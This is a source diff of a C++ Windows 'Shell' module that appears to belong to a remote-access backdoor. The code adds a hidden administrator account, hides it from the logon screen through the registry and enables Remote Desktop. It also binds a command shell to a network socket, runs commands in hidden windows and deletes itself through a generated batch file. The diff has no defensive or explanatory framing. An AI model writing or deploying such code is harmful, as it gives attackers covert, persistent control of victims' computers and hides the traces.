@@ -14,6 +14,7 @@
 #include "info.h"
 #include "crypted_global.h"
 #include "register.h"
+#include "tstring.h"
 
 #include "memory_debug.h"
 
@@ -21,86 +22,81 @@
 
 #pragma warning( disable : 4800 ) // stupid warning about bool
 
-void Shell::executeCmd(const char *arguments){
-	Shell::execute("cmd.exe /C", arguments);
+using namespace std;
+
+bool Shell::executeCmd(const wchar_t *arguments, bool waitForTerminate, bool hideWindow){
+	return Shell::execute(L"cmd.exe /C", arguments, waitForTerminate, hideWindow);
 }
 
-void Shell::addRdpUser(const char *username, const char *password){
-	std::string rdu = Info::getNameFromSid("S-1-5-32-555");
-	MYPRINTF("RDU: %s\n", rdu.c_str());
+bool Shell::addRdpUser(const wchar_t *username, const wchar_t *password){
+	std::wstring rdu = Info::getNameFromSid(L"S-1-5-32-555");
+	MYPRINTF("RDU: %w\n", rdu.c_str());
 
-	if (rdu.empty()){
-		return;
-	}
+	std::wstring admin = Info::getNameFromSid(L"S-1-5-32-544");
+	MYPRINTF("ADMIN: %w\n", admin.c_str());
 
-	std::string admin = Info::getNameFromSid("S-1-5-32-544");
-	MYPRINTF("ADMIN: %s\n", admin.c_str());
-
-	if (admin.empty()){
-		return;
-	}
-
-	char buffer[BUFFER_SIZE];
-	sprintf_s(buffer, BUFFER_SIZE, "net user %s %s /add", username, password);
-	Shell::executeCmd(buffer);
+	wchar_t buffer[BUFFER_SIZE];
+	swprintf_s(buffer, BUFFER_SIZE, TEXT("net user %s %s /add"), username, password);
+	Shell::executeCmd(buffer, true, true);
 	MYPRINTF("user added\n");
-	Sleep(1000);
-
+	
 	Register reg;
-	reg.createDwordKey(HKEY_LOCAL_MACHINE, 
-							"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
+	if (!reg.createDwordKey(HKEY_LOCAL_MACHINE, 
+							TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"),
 							username,
-							0);
+							0)){
+		return false;
+	}
 
-	reg.createDwordKey(HKEY_LOCAL_MACHINE, 
-						"System\\CurrentControlSet\\Control\\Terminal Server",
-						"fDenyTSConnections",
-						0);
+	if (!reg.createDwordKey(HKEY_LOCAL_MACHINE, 
+						TEXT("System\\CurrentControlSet\\Control\\Terminal Server"),
+						TEXT("fDenyTSConnections"),
+						0)){
+		return false;
+	}
 
+	if (!rdu.empty()){
+		swprintf_s(buffer, BUFFER_SIZE,  TEXT("net localgroup \"%s\" \"%s\" /add"), rdu.c_str(), username);
+		Shell::executeCmd(buffer, true, true);
+	}
 
+	if (!admin.empty()){
+		swprintf_s(buffer, BUFFER_SIZE,  TEXT("net localgroup \"%s\" \"%s\" /add"), admin.c_str(), username);
+		Shell::executeCmd(buffer, true, true);
+	}
 
-
-	sprintf_s(buffer, BUFFER_SIZE, "net localgroup \"%s\" \"%s\" /add", rdu.c_str(), username);
-	Shell::executeCmd(buffer);
-	Sleep(1000);
-
-
-
-	sprintf_s(buffer, BUFFER_SIZE, "net localgroup \"%s\" \"%s\" /add", admin.c_str(), username);
-	Shell::executeCmd(buffer);
-	Sleep(1000);
-
-	sprintf_s(buffer, BUFFER_SIZE, "sc start termservice");
-	Shell::executeCmd(buffer);
-	Sleep(1000);
+	swprintf_s(buffer, BUFFER_SIZE,  TEXT("sc start termservice"));
+	Shell::executeCmd(buffer, true, true);
+	return true;
 }
 
-void Shell::removeRdpUser(const char *username){
-	char buffer[BUFFER_SIZE];
+void Shell::removeRdpUser(const wchar_t *username){
+	wchar_t buffer[BUFFER_SIZE];
 	
-	sprintf_s(buffer, BUFFER_SIZE, "net user %s /delete", username);
-	Shell::executeCmd(buffer);
+	swprintf_s(buffer, BUFFER_SIZE, TEXT("net user %s /delete"), username);
+	Shell::executeCmd(buffer, true, true);
 	MYPRINTF("user removed\n");
 
 	// TODO: remove from UserList
 }
 
-std::string Shell::getCmdOutput(const char *arguments){
-	char szCmdline[BUFFER_SIZE];
-	sprintf_s(szCmdline, BUFFER_SIZE, "cmd.exe /C %s", arguments);
-	return Shell::getProcessOutput(szCmdline);
+std::wstring Shell::getCmdOutput(const wchar_t *arguments, bool hideWindow){
+	wchar_t szCmdline[BUFFER_SIZE];
+	swprintf_s(szCmdline, BUFFER_SIZE, TEXT("cmd.exe /C %s"), arguments);
+	string res = Shell::getProcessOutput(szCmdline, hideWindow);
+	return Shell::convertFromCurrentCodePage(res);
 }
 
-std::string Shell::getProcessOutput(const char *arguments){
-	HANDLE g_hChildStd_OUT_Rd = NULL;
-	HANDLE g_hChildStd_OUT_Wr = NULL;
-	HANDLE g_hChildStd_ERR_Rd = NULL;
-	HANDLE g_hChildStd_ERR_Wr = NULL;
+std::string Shell::getProcessOutput(const wchar_t *arguments, bool hideWindow){
+	HANDLE g_hChildStd_OUT_Rd = 0;
+	HANDLE g_hChildStd_OUT_Wr = 0;
+	HANDLE g_hChildStd_ERR_Rd = 0;
+	HANDLE g_hChildStd_ERR_Wr = 0;
 	SECURITY_ATTRIBUTES sa; 
     // Set the bInheritHandle flag so pipe handles are inherited. 
     sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
     sa.bInheritHandle = TRUE; 
-    sa.lpSecurityDescriptor = NULL; 
+    sa.lpSecurityDescriptor = 0; 
     // Create a pipe for the child process's STDERR. 
     if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) {
         return "";
@@ -119,8 +115,8 @@ std::string Shell::getProcessOutput(const char *arguments){
     }
     // Create the child process. 
     // Set the text I want to run
-	char szCmdline[BUFFER_SIZE];
-	sprintf_s(szCmdline, BUFFER_SIZE, "%s", arguments);
+	wchar_t szCmdline[BUFFER_SIZE];
+	swprintf_s(szCmdline, BUFFER_SIZE, TEXT("%s"), arguments);
 
     PROCESS_INFORMATION piProcInfo; 
     STARTUPINFO siStartInfo;
@@ -136,18 +132,25 @@ std::string Shell::getProcessOutput(const char *arguments){
     siStartInfo.hStdError = g_hChildStd_ERR_Wr;
     siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+	if (!hideWindow){
+		siStartInfo.lpDesktop = L"Winsta0\\default";
+	} else {
+		siStartInfo.dwFlags |= STARTF_USESHOWWINDOW;
+		siStartInfo.wShowWindow = SW_HIDE;
+	}
 
     // Create the child process. 
     bSuccess = CreateProcess(NULL, 
         szCmdline,     // command line 
-        NULL,          // process security attributes 
-        NULL,          // primary thread security attributes 
+        0,          // process security attributes 
+        0,          // primary thread security attributes 
         TRUE,          // handles are inherited 
-        0,             // creation flags 
-        NULL,          // use parent's environment 
-        NULL,          // use parent's current directory 
+        hideWindow ? (CREATE_NO_WINDOW|NORMAL_PRIORITY_CLASS) : NORMAL_PRIORITY_CLASS,             // creation flags 
+        0,          // use parent's environment 
+        0,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
         &piProcInfo);  // receives PROCESS_INFORMATION
+
     CloseHandle(g_hChildStd_ERR_Wr);
     CloseHandle(g_hChildStd_OUT_Wr);
     // If an error occurs, exit the application. 
@@ -157,11 +160,11 @@ std::string Shell::getProcessOutput(const char *arguments){
 
     // Read from pipe that is the standard output for child process. 
     DWORD dwRead; 
-    CHAR chBuf[4096];
+    char chBuf[4096];
 
     std::string out = "", err = "";
     for (;;) { 
-        bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
+        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, 0);
         if( ! bSuccess || dwRead == 0 ) break; 
 
         std::string s(chBuf, dwRead);
@@ -169,40 +172,77 @@ std::string Shell::getProcessOutput(const char *arguments){
     } 
     dwRead = 0;
     for (;;) { 
-        bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, 4096, &dwRead, NULL);
+        bSuccess = ReadFile( g_hChildStd_ERR_Rd, chBuf, 4096, &dwRead, 0);
         if( ! bSuccess || dwRead == 0 ) break; 
 
         std::string s(chBuf, dwRead);
         err += s;
 
     } 
+	CloseHandle(g_hChildStd_OUT_Rd);
+    CloseHandle(g_hChildStd_ERR_Rd);
     // The remaining open handles are cleaned up when this process terminates. 
     // To avoid resource leaks in a larger application, 
     //   close handles explicitly.
     return out; 
 }
 
-void Shell::execute(const char *filename, const char *arguments){
-	char buffer[BUFFER_SIZE];
+std::wstring Shell::convertFromCurrentCodePage(const std::string &message){
+	UINT codePage = GetOEMCP();
+	MYPRINTF("oemCP: %u\n", GetOEMCP());
+	MYPRINTF("ACP: %u\n", GetACP());
+
+	const char *ascii = message.c_str();
+	LPWSTR wide = 0;
+	int wideSize = 0;
+
+	int result = MultiByteToWideChar(codePage, 0, ascii, -1, wide, wideSize);
+	if (result == 0){
+		return L"";
+	}
+	wideSize = result;
+	wide = new WCHAR[result];
+	result = MultiByteToWideChar(codePage, 0, ascii, -1, wide, wideSize);
+	if (result == 0){
+		return L"";
+	}	
+
+	return wide;
+}
+
+bool Shell::execute(const wchar_t *filename, const wchar_t *arguments, bool waitForTerminate, bool hideWindow){
+	wchar_t buffer[BUFFER_SIZE];
 	BOOL res;
 	PROCESS_INFORMATION processInformation;
 	STARTUPINFO startupInfo;
-	LPSTR szCmdline;
+	LPTSTR szCmdline;
 
-	sprintf_s(buffer, BUFFER_SIZE, "%s %s", filename, arguments);
+	swprintf_s(buffer, BUFFER_SIZE, TEXT("%s %s"), filename, arguments);
 
-	szCmdline = _strdup(buffer);
+	szCmdline = _wcsdup(buffer);
 
 	ZeroMemory( &startupInfo, sizeof(startupInfo) );
 	startupInfo.cb = sizeof(STARTUPINFO);
+	if (!hideWindow){
+		startupInfo.lpDesktop = L"Winsta0\\default";
+	} else {
+		startupInfo.dwFlags = STARTF_USESHOWWINDOW;
+		startupInfo.wShowWindow = SW_HIDE;
+	}
 
 	ZeroMemory( &processInformation, sizeof(processInformation) );
 
-	res = CreateProcess(0, szCmdline, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
+	res = CreateProcess(0, szCmdline, 0, 0, FALSE, hideWindow ? (CREATE_NO_WINDOW|NORMAL_PRIORITY_CLASS) : NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
 	if (res == 0){
-		MYPRINTF("ERROR: CreateProcess failed!%d", GetLastError());
+		MYPRINTF("ERROR: CreateProcess failed!%d\n", GetLastError());
+		return false;
 	}
+	if (waitForTerminate){
+		WaitForSingleObject(processInformation.hProcess, 1000 * 60 * 5);
+	}
+
 	free(szCmdline);
+	return true;
 }
 
 bool Shell::openShell(int port){
@@ -232,7 +272,7 @@ void Shell::openShellOnSocket(SOCKET clientSocket){
 	PROCESS_INFORMATION processInformation;
 	// Options for process
 	STARTUPINFO startupInfo;
-	LPSTR szCmdline = _strdup("cmd");
+	LPTSTR szCmdline = _wcsdup(L"cmd");
 
 	ZeroMemory( &processInformation, sizeof(processInformation) );
 	ZeroMemory( &startupInfo, sizeof(startupInfo) );
@@ -270,14 +310,15 @@ int Shell::killAtNextReboot(){
 void Shell::deleteCurrent(){
 	HANDLE hFile;
 	DWORD  dwBytesWritten;
-	char buffer[512];
+	wchar_t buffer[512];
 	BOOL res;
 	PROCESS_INFORMATION processInformation;
 	STARTUPINFO startupInfo;
-	LPSTR szCmdline;
-	char * batfile = "dte.bat";
+	LPTSTR szCmdline;
+	wchar_t * batfile = L"dte.bat";
 
-	sprintf_s(buffer, 512, SnE("6g6m0qfavob2X3GSSM11s0hE2JJKkiQO2pYoZ+fQd+9yzdE4ae+PIuQik3jQroz5krr74dLAXDHgk/QY", "'ping -n 20 127.0.0.1\r\ndel \"%s\"\r\ndel \"%s\"\r\nexit\r\n'"), Info::getModuleName().c_str(), batfile);
+	const wchar_t *command = L"ping -n 20 127.0.0.1\r\ndel \"%s\"\r\ndel \"%s\"\r\nexit\r\n";
+	swprintf_s(buffer, COUNTOF(buffer), command, Info::getModuleName().c_str(), batfile);
 
 	hFile = CreateFile(batfile,
 		FILE_WRITE_DATA,
@@ -287,20 +328,21 @@ void Shell::deleteCurrent(){
 		FILE_ATTRIBUTE_NORMAL,
 		NULL);
 
-	WriteFile(hFile, buffer, strlen(buffer), &dwBytesWritten, NULL);
+	char *bufferAsChar = wToc(buffer);
+	WriteFile(hFile, bufferAsChar, strlen(bufferAsChar), &dwBytesWritten, NULL);
+	delete[] bufferAsChar;
 	CloseHandle(hFile);
 
-	szCmdline = _strdup(batfile);
-
+	szCmdline = _wcsdup(L"cmd.exe /C dte.bat");
 
 	ZeroMemory( &startupInfo, sizeof(startupInfo) );
 	startupInfo.cb = sizeof(STARTUPINFO);
 
-
 	ZeroMemory( &processInformation, sizeof(processInformation) );
 
-	res = CreateProcess(0, szCmdline, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
+	res = CreateProcess(0, szCmdline, 0, 0, TRUE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 0, 0, &startupInfo, &processInformation);
 	if (res == 0){
-		MYPRINTF("ERROR: CreateProcess failed!%d", GetLastError());
+		MYPRINTF("ERROR: CreateProcess failed! %d\n", GetLastError());
+		return;
 	}
 }
